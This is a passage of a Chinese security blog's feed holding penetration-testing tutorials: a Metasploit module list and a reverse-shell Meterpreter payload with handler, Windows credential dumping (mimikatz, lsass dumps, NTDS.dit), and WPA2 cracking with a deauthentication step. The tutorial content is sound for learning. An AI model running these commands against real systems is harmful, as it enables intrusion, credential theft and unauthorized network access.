//扫描系统版本</span><br></pre></td></tr></table></figure><blockquote><p>SQLSERVER登录扫描</p></blockquote><p>使用<code>auxiliary/scanner/mssql/</code>下的模块探测SQL server的信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mssql/mssql_hashdump  //dump密码hash</span><br><span class="line">auxiliary/scanner/mssql/mssql_login     //密码爆破</span><br><span class="line">auxiliary/scanner/mssql/mssql_ping      //嗅探</span><br><span class="line">auxiliary/scanner/mssql/mssql_schemadump</span><br></pre></td></tr></table></figure><blockquote><p>SSH探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/ssh/</code>下的模块探测ssh信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/cerberus_sftp_enumusers</span><br><span class="line">auxiliary/scanner/ssh/detect_kippo</span><br><span class="line">auxiliary/scanner/ssh/ssh_enumusers     //枚举用户</span><br><span class="line">auxiliary/scanner/ssh/ssh_identify_pubkeys</span><br><span class="line">auxiliary/scanner/ssh/ssh_login         //密码爆破</span><br><span class="line">auxiliary/scanner/ssh/ssh_login_pubkey</span><br><span class="line">auxiliary/scanner/ssh/ssh_version       //查看版本</span><br></pre></td></tr></table></figure><blockquote><p>FTP探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/ftp/</code>下的模块探测ftp信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/anonymous         </span><br><span class="line">auxiliary/scanner/ftp/bison_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/ftp_login         //密码爆破</span><br><span class="line">auxiliary/scanner/ftp/ftp_version       //查看版本</span><br><span class="line">auxiliary/scanner/ftp/konica_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/pcman_ftp_traversal</span><br><span class="line">auxiliary/scanner/ftp/titanftp_xcrc_traversal</span><br></pre></td></tr></table></figure><blockquote><p>MYSQL探测扫描</p></blockquote><p>使用<code>auxiliary/scanner/mysql/</code>下的模块探测mysql信息</p><p>模块有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_authbypass_hashdump</span><br><span class="line">auxiliary/scanner/mysql/mysql_file_enum</span><br><span class="line">auxiliary/scanner/mysql/mysql_hashdump   //dump密码hash</span><br><span class="line">auxiliary/scanner/mysql/mysql_login      //密码爆破</span><br><span class="line">auxiliary/scanner/mysql/mysql_schemadump</span><br><span class="line">auxiliary/scanner/mysql/mysql_version    //查看版本</span><br></pre></td></tr></table></figure><h2 id="内网操作基本步骤流程"><a href="#内网操作基本步骤流程" class="headerlink" title="内网操作基本步骤流程"></a>内网操作基本步骤流程</h2><blockquote><p>制作msf回连木马  </p></blockquote><p>当获得webshell的时候，我们制作一个msf木马来进行回连</p><p><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=443 =F exe &gt;/root/Desktop/443.exe</code></p><blockquote><p>回连准备</p></blockquote><p>打开msfconsole，准备进行回连<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler                     //使用后门模块</span><br><span class="line">set payload windows/meterpreter/reverse_tcp   //设置payload</span><br><span class="line">show options                   </span><br><span class="line">set LHOST 192.168.1.1                         //设置回连地址</span><br><span class="line">set lport 443                                 //设置回连端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p><blockquote><p>查看基本情况</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">getuid     //查看当前用户</span><br><span class="line">getsystem  //提权</span><br></pre></td></tr></table></figure><blockquote><p> 提权</p></blockquote><p><code>background</code> 或 <code>ctrl+z</code><br>将回连的meterpreter放入session中 sessions ­i 号 叫回session 在msf下use exploit/windows/local/ TAB 可以列出所有的可提权的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(handler) &gt; use exploit/windows/local/             //调用windows的本地模块</span><br></pre></td></tr></table></figure><blockquote><p>密码获取与解密</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hashdump      //密码获取</span><br><span class="line">load mimikatz //使用mimikatz</span><br><span class="line">kerberos      //查看解密</span><br></pre></td></tr></table></figure><blockquote><p>新路由查看子网</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">route         //查看路由</span><br><span class="line">background </span><br><span class="line">sessions </span><br><span class="line">route add 192.168.2.0 255.255.255.0 2    //路由添加</span><br><span class="line">search mssql   //找mssql模块</span><br><span class="line">use auxiliary/scanner/mssql/mssql_login  //使用login模块</span><br></pre></td></tr></table></figure><blockquote><p>查看机器是否是虚拟机</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/checkvm</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>上面的这些模块是我们使用mfs中最经常使用的模块，对这些基础模块进行一个整理，以后使用会更加方便一点，当时是一个特别棒的工具，以后再慢慢写其他的模块。</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;msf常用模块整理&quot;&gt;&lt;a href=&quot;#msf常用模块整理&quot; class=&quot;headerlink&quot; title=&quot;msf常用模块整理&quot;&gt;&lt;/a&gt;msf常用模块整理&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;主机信息收集&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;使用&lt;code&gt;auxiliary/scanner/discovery/&lt;/code&gt;下模块进行扫描&lt;/p&gt;
&lt;p&gt;模块有：&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/arp_sweep&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/empty_udp&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/ipv6_multicast_ping&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/ipv6_neighbor&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/ipv6_neighbor_router_advertisement&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/udp_probe&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;use auxiliary/scanner/discovery/udp_sweep&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="metasploit" scheme="https://www.marksec.org/tags/metasploit/"/>
    
  </entry>
  
  <entry>
    <title>内网渗透之hash抓取</title>
    <link href="https://www.marksec.org/2017/12/19/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8B%E6%8A%93hash/"/>
    <id>https://www.marksec.org/2017/12/19/内网渗透之抓hash/</id>
    <published>2017-12-19T12:55:00.000Z</published>
    <updated>2019-03-24T05:30:32.692Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>  在平时的渗透工作中，对于服务器或者机器的密码的抓取是必须的，不管是明文密码还是hash都对我们后续的安全渗透工作大有裨益，今天我总结几款比较常见的密码抓取工具，供大家一起学习讨论。<br></blockquote><h2 id="WCE"><a href="#WCE" class="headerlink" title="WCE"></a>WCE</h2><p>wce是一款基础款工具，其命令也只要<code>wce.exe -w</code>即可，作为基础款工具，局限特别大，面对杀软等根本无法免杀，所以一般使用较少。</p><h2 id="MIMIKATZ"><a href="#MIMIKATZ" class="headerlink" title="MIMIKATZ"></a>MIMIKATZ</h2><p>mimikatz作为老牌的黑客工具已经升级到2.0的版本了，其中破解密码的功能也是非常方便，但对于杀软的防御也较弱，如果完全控制机器，关闭杀软也可，在msf中也要mimikatz的模块<br>也可以在渗透中较为方便的获得密码</p><pre>mimikatz# privilege::debug  //提升权限mimikatz# sekurlsa::logonpasswords  //抓取密码</pre><a id="more"></a>## PROCDUMPProcdump是一个轻量级的Sysinternal团队开发的命令行工具, 它的主要目的是监控应用程序的CPU异常动向, 并在此异常时生成crash dump文件, 供研发人员和管理员确定问题发生的原因，你还可以把它作为生成dump的工具使用在其他的脚本中。因为可以抓取内存生成dump，所以我们可以抓取内存进行分析解密用户名和密码，该工具作为工程师分析CPU的工具，所以杀软等都没有报毒，安全可靠。<pre>管理员身份启动cmdprocdump64.exe -accepteula -ma lsass.exe 文件名（1.dmp） 存放路径</pre>将生成的文件传出后使用mimikatz破解<pre>mimikatz # sekurlsa::minidump 文件名（1.dmp）mimikatz # sekurlsa::logonPasswords full</pre><h2 id="域快照"><a href="#域快照" class="headerlink" title="域快照"></a>域快照</h2><pre>使用域管账号登陆，以管理员身份启动cmd 执行： snapshot activate instance ntds create mount {GUID} #{GUID是一串数字} 进入c盘根目录，进入域快照内 将\WINDOWS\NTDS\目录下的NTDS.dit拷贝出 卸载快照 unmount {GUID} quit quit备份system.hive reg save hklm\system c:\system.hive</pre> 将上述两个文件拷出，使用QuarksPwDump离线版进行破解(插一句：QuarksPwDump有直接抓取版，但对过杀软程度未可知) <pre> ntdsutil snapshot "activate instance ntds" create quit quit >> 1.txt reg save hklm\system c:\windows\temp\xxsyskeyaa.hive ntdsutil snapshot "mount {1.txt中的GUID}" quit quit</pre> <blockquote><br>   对于hash的抓取方法还有powershell等许多方法，在此就不多于赘述了，等学习powershell的时候再详细的写文章，注意本文仅作为交流学习用，请勿用作他处。 <br><br>   *本文为原创，转载请注明出处<br> </blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;  在平时的渗透工作中，对于服务器或者机器的密码的抓取是必须的，不管是明文密码还是hash都对我们后续的安全渗透工作大有裨益，今天我总结几款比较常见的密码抓取工具，供大家一起学习讨论。&lt;br&gt;&lt;/blockquote&gt;

&lt;h2 id=&quot;WCE&quot;&gt;&lt;a href=&quot;#WCE&quot; class=&quot;headerlink&quot; title=&quot;WCE&quot;&gt;&lt;/a&gt;WCE&lt;/h2&gt;&lt;p&gt;wce是一款基础款工具，其命令也只要&lt;code&gt;wce.exe -w&lt;/code&gt;即可，作为基础款工具，局限特别大，面对杀软等根本无法免杀，所以一般使用较少。&lt;/p&gt;
&lt;h2 id=&quot;MIMIKATZ&quot;&gt;&lt;a href=&quot;#MIMIKATZ&quot; class=&quot;headerlink&quot; title=&quot;MIMIKATZ&quot;&gt;&lt;/a&gt;MIMIKATZ&lt;/h2&gt;&lt;p&gt;mimikatz作为老牌的黑客工具已经升级到2.0的版本了，其中破解密码的功能也是非常方便，但对于杀软的防御也较弱，如果完全控制机器，关闭杀软也可，在msf中也要mimikatz的模块&lt;br&gt;也可以在渗透中较为方便的获得密码&lt;/p&gt;
&lt;pre&gt;
mimikatz# privilege::debug  //提升权限
mimikatz# sekurlsa::logonpasswords  //抓取密码&lt;/pre&gt;
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://www.marksec.org/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="Web安全" scheme="https://www.marksec.org/tags/Web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>无线wifi破解</title>
    <link href="https://www.marksec.org/2017/02/16/%E6%97%A0%E7%BA%BFWiFi%E7%A0%B4%E8%A7%A3/"/>
    <id>https://www.marksec.org/2017/02/16/无线WiFi破解/</id>
    <published>2017-02-16T00:55:00.000Z</published>
    <updated>2019-03-20T15:36:36.663Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>  WiFi在我们生活中扮演不可或缺的角色，对于WiFi安全也是人们关注的热点之一，现在教大家利用软件进行WiFi破解渗透，注意WiFi破解技术只用于技术交流，生活中破解他人WiFi属于侵权行为。<br></blockquote><h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>我们需要一台电脑，一块无线网卡，一个kail系统，如果你是Windows系统，你可以将kail系统安装在虚拟机里，然后kail虚拟机导入你的无线网卡就可以完成前期准备，小米WiFi和360WiFi都可以变为无线网卡使用，如果你的Linux系统就可以直接使用了，我使用的是archLinux的发行版manjaro，我们使用的软件是aircrack-ng 这一款WiFi破解软件，它主要破解的是wpa/wpa2的WiFi，对于wpe的WiFi现在已经绝迹，这里就不说了。<br><a id="more"></a></p><h2 id="破解步骤"><a href="#破解步骤" class="headerlink" title="破解步骤"></a>破解步骤</h2><h3 id="查看自己的无线网"><a href="#查看自己的无线网" class="headerlink" title="查看自己的无线网"></a>查看自己的无线网</h3><p><code>airmon-ng</code></p><pre>[makai@manjaro ~]$ sudo airmon-ng  //sudo为提为root权限，root用户无需sudoPHY     Interface       Driver          Chipsetphy0    wlp3s0          rtl8192ce       Realtek Semiconductor Co., Ltd. RTL8188CE 802.11b/g/n WiFi Adapter (rev 01)</pre><p>上面的命令是列出支持监控模式的无线网卡，wlp3s0即为我们的网卡，如果没有任何输出，表示无线网卡不支持监控模式。你可以看到我的wlan0支持监控模式</p><h3 id="开启无线网卡的监控模式"><a href="#开启无线网卡的监控模式" class="headerlink" title="开启无线网卡的监控模式"></a>开启无线网卡的监控模式</h3><p><code>airmon-ng start wlp3s0</code></p><pre>[makai@manjaro ~]$ sudo airmon-ng start wlp3s0Found 4 processes that could cause trouble.If airodump-ng, aireplay-ng or airtun-ng stops working aftera short period of time, you may want to run 'airmon-ng check kill'  PID Name  470 avahi-daemon  472 NetworkManager  484 avahi-daemon  523 wpa_supplicantPHY     Interface       Driver          Chipsetphy0    wlp3s0          rtl8192ce       Realtek Semiconductor Co., Ltd. RTL8188CE 802.11b/g/n WiFi Adapter (rev 01)                (mac80211 monitor mode vif enabled for [phy0]wlp3s0 on [phy0]wlp3s0mon)//开启监控后，系统自动将wlp3s0转为了wlp3s0mon                (mac80211 station mode vif disabled for [phy0]wlp3s0)</pre><h3 id="查看当前WiFi网络"><a href="#查看当前WiFi网络" class="headerlink" title="查看当前WiFi网络"></a>查看当前WiFi网络</h3><p>  <code>airodump-ng wlp3s0mon</code></p><pre>[CH  9 ][ Elapsed: 24 s ][ 2016-11-02 16:22 ]BSSID              PWR  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID00:87:46:20:08:1F  -46       57       49    2   6  54e. WPA2 CCMP   PSK  36000:36:76:11:61:A7  -53       50      999   49   1  54e. WPA2 CCMP   PSK  mima1-8F0:B4:29:3B:E0:65  -47       47      628    0   1  54e. WPA2 CCMP   PSK  redian8C:F2:28:26:CE:AA  -44       38       26    0  13  54e  WPA2 CCMP   PSK  MERCURY_CEAA  //这是我们的实验路由器B0:D5:9D:6D:2E:F8  -53       58      338   65  11  54e. WPA2 CCMP   PSK  360免费WiFi-F8B0:D5:9D:80:C0:B0  -47       47        1    0   6  54e. WPA2 CCMP   PSK  360免费WiFi-B0D4:83:04:F9:27:3A  -56       50       12    0  11  54e. WPA2 CCMP   PSK  FAST30:FC:68:23:44:C4  -64       28        9    0   1  54e. WPA2 CCMP   PSK  CMCC-02BSSID              STATION            PWR   Rate    Lost    Frames  Probe(not associated)   B6:F6:EA:9D:63:F4  -21    0 - 1      4        4(not associated)   20:82:C0:10:FA:D9  -77    0 - 1      0        3  XiaoFangJia(not associated)   AC:36:13:79:54:2C  -81    0 - 1      0        100:87:46:20:08:1F  CC:3A:61:C9:15:77  -37    0 - 1      0        500:87:46:20:08:1F  A4:44:D1:32:25:27  -33    0 - 1     21       4900:87:46:20:08:1F  C0:EE:FB:06:2B:9A  -47    0 - 1e     0       4800:36:76:11:61:A7  9C:2A:70:C9:C3:53  -35    1e- 1e  1173      90700:36:76:11:61:A7  74:E5:0B:A3:C6:B2  -46    1e- 1e   296       9000:36:76:11:61:A7  90:C1:15:F1:86:C9  -55    0 - 1     12        400:36:76:11:61:A7  C4:43:8F:F2:88:96  -71    1e- 1      0       13F0:B4:29:3B:E0:65  60:F1:89:60:6D:CA  -34    1e- 1e     0      6278C:F2:28:26:CE:AA  68:3E:34:3C:47:C0  -47    1e- 1      0       54B0:D5:9D:6D:2E:F8  38:BC:1A:EC:34:62  -55    1e- 1e    44      340D4:83:04:F9:27:3A  38:BC:1A:23:B1:51  -67    0 - 1    100        7D4:83:04:F9:27:3A  D0:7A:B5:57:60:21  -69    0 - 1      0        1</pre><p>上面列出了周围的wifi和它们的详细信息，包括信号强度、加密类型、频道等，要记住要破解wifi的频道号（CH）和BSSID<br>ctrl+c结束进程，ctrl+s暂停，ctrl+q继续，可以利用这三个快捷键进行操作，当前我们可以ctrl+c停止</p><h3 id="抓取握手包"><a href="#抓取握手包" class="headerlink" title="抓取握手包"></a>抓取握手包</h3><p><code>airodump-ng -c 13 -w test  wlp3s0mon</code><br>-c为CH即为信道,-w 为保存的位置,-w test为将数据包保存在test文件</p><pre>CH 13 ][ Elapsed: 24 s ][ 2016-11-02 16:44 ][ fixed channel wlp3s0mon: 4BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSIDF0:B4:29:3B:E0:65  -46   1       30      522    0   1  54e. WPA2 CCMP   PSK  redianB0:D5:9D:80:C0:B0  -47   0       18        0    0   6  54e. WPA2 CCMP   PSK  360免费WiFi-B08C:F2:28:26:CE:AA  -49  43       95       22    0  13  54e  WPA2 CCMP   PSK  MERCURY_CEAA   //我们的路由器mac00:36:76:11:61:A7  -47   0       25      117    1   1  54e. WPA2 CCMP   PSK  mima1-800:87:46:20:08:1F  -53   5       26       26    0   6  54e. WPA2 CCMP   PSK  360D4:83:04:F9:27:3A  -57   0      115       32    0  11  54e. WPA2 CCMP   PSK  FAST30:FC:68:23:44:C4  -58   0       28        6    1   1  54e. WPA2 CCMP   PSK  CMCC-02B0:D5:9D:6D:2E:F8  -63   9      112      112   12  11  54e. WPA2 CCMP   PSK  360免费WiFi-F8BSSID              STATION（手机mac地址） PWR   Rate    Lost    Frames  Probe(not associated)   00:19:86:31:94:24  -47    0 - 1      0        2(not associated)   A4:17:31:4F:0C:5F  -47    0 - 1     15        6(not associated)   8A:84:7C:92:A9:53  -51    0 - 1      2        3(not associated)   68:3E:34:3C:91:58  -55    0 - 1     13        7(not associated)   AC:B5:7D:20:46:D1  -59    0 - 1      0       18  CMCC-01F0:B4:29:3B:E0:65  60:F1:89:60:6D:CA  -37    1e- 1e     0      5228C:F2:28:26:CE:AA  68:3E:34:3C:47:C0  -17    1e- 1      0       27    //路由器链接的手机mac00:36:76:11:61:A7  9C:2A:70:C9:C3:53  -34    1e- 1e     3      11400:36:76:11:61:A7  24:0A:64:9C:E9:91  -47    0 - 1e     0        400:36:76:11:61:A7  90:C1:15:F1:86:C9  -54    0 - 1e     0        300:36:76:11:61:A7  C4:43:8F:F2:88:96  -77    0 - 1      0        100:87:46:20:08:1F  A4:44:D1:32:25:27  -47    0 - 1e     0       56D4:83:04:F9:27:3A  38:BC:1A:23:B1:51  -69    0 - 1    961       52D4:83:04:F9:27:3A  08:57:00:C4:42:3A  -65    0 - 1e     0        5  FAST30:FC:68:23:44:C4  20:2D:07:CE:8C:CE  -79    0 - 1e   228       1230:FC:68:23:44:C4  70:EC:E4:BF:C2:9F  -64    0 - 1      0        1</pre><h3 id="强制使连接到wifi的设备重新连接路由器"><a href="#强制使连接到wifi的设备重新连接路由器" class="headerlink" title="强制使连接到wifi的设备重新连接路由器"></a>强制使连接到wifi的设备重新连接路由器</h3><p><code>aireplay-ng -0 1 -a  8C:F2:28:26:CE:AA -c 68:3E:34:3C:47:C0 wlp3s0mon</code><br><br>-0指定发送反认证包的个数 -a指定无线路由器BSSID -c指定强制断开的设置</p><pre>[makai@manjaro ~]$ sudo aireplay-ng -0 1 -a  8C:F2:28:26:CE:AA -c 68:3E:34:3C:47:C0 wlp3s0mon16:52:46  Waiting for beacon frame (BSSID: 8C:F2:28:26:CE:AA) on channel 1316:52:47  Sending 64 directed DeAuth. STMAC: [68:3E:34:3C:47:C0] [ 8|57 ACKs]CH 13 ][ Elapsed: 55 mins ][ 2016-11-02 18:26 ][ WPA handshake: 8C:F2:28:26:CE:AA //我们可以看到这里变成了handshake，就是抓完包了BSSID              PWR RXQ  Beacons    #Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID</pre><p>掉线是为了让上网设备断网重新连接WiFi，这样我们就可以抓取它连接路由器时候的握手包了</p><h3 id="破解WiFi"><a href="#破解WiFi" class="headerlink" title="破解WiFi"></a>破解WiFi</h3><p><code>aircrack-ng -w 1.txt test-01.cap</code><br>1.txt为你的密码字典test-01.cap就是之前截取的包</p><pre>[makai@manjaro ~]$ sudo aircrack-ng -w 1.txt test-01.capOpening test-01.capRead 714 packets.   #  BSSID              ESSID                     Encryption   1  8C:F2:28:26:CE:AA  MERCURY_CEAA              WPA (1 handshake)   2  B0:D5:9D:6D:2E:F8  360免费WiFi-F8          WPA (0 handshake)   3  D4:83:04:F9:27:3A  FAST                      WPA (0 handshake)Index number of target network ? 1  //选择1就是破解我们的目标路由器Aircrack-ng 1.2 rc4[00:00:15] 16084/19326 keys tested (1106.08 k/s)Time left: 2 seconds                                      83.22%  KEY FOUND! [ 19940515 ]  //我们目标路由器的密码Master Key     : 69 F5 C8 9C 45 26 03 23 08 FE 27 03 D8 83 6C 0A4B 26 E1 AE 07 99 B6 11 51 1A 0F 25 AD 22 E9 5ATransient Key  : DC A9 11 93 44 A9 6A 8E 9D 79 4C 80 4F 61 3D 8CB8 C0 5C 00 B0 D0 E8 99 E7 C6 C6 FB 6D D4 D3 3594 0A A3 3B 17 00 08 F7 BA F0 4D 5E 9E B7 2C 3F22 89 70 A6 36 1E 63 D2 64 8E 52 79 FD 41 57 70EAPOL HMAC     : FD 4E CB 71 B6 9C BB E6 A2 62 6F 92 A5 54 F8 85</pre><h3 id="关闭网卡监听模式"><a href="#关闭网卡监听模式" class="headerlink" title="关闭网卡监听模式"></a>关闭网卡监听模式</h3><p><code>airmon-ng stop wlp3s0</code></p><blockquote><br>  这就是WiFi破解的全过程，当然我们还有其他的破解方法，比如ping破解法，但是总的来说使用aircrack-ng来破解WiFi是主流，同时破解字典也是十分重要的，最后再次说明，WiFi破解只能拿来技术交流，不要轻易破解他人WiFi <br><br>  *本文为原创，转载请注明出处<br></blockquote>]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;  WiFi在我们生活中扮演不可或缺的角色，对于WiFi安全也是人们关注的热点之一，现在教大家利用软件进行WiFi破解渗透，注意WiFi破解技术只用于技术交流，生活中破解他人WiFi属于侵权行为。&lt;br&gt;&lt;/blockquote&gt;

&lt;h2 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h2&gt;&lt;p&gt;我们需要一台电脑，一块无线网卡，一个kail系统，如果你是Windows系统，你可以将kail系统安装在虚拟机里，然后kail虚拟机导入你的无线网卡就可以完成前期准备，小米WiFi和360WiFi都可以变为无线网卡使用，如果你的Linux系统就可以直接使用了，我使用的是archLinux的发行版manjaro，我们使用的软件是aircrack-ng 这一款WiFi破解软件，它主要破解的是wpa/wpa2的WiFi，对于wpe的WiFi现在已经绝迹，这里就不说了。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="无线安全" scheme="https://www.marksec.org/tags/%E6%97%A0%E7%BA%BF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
</feed>
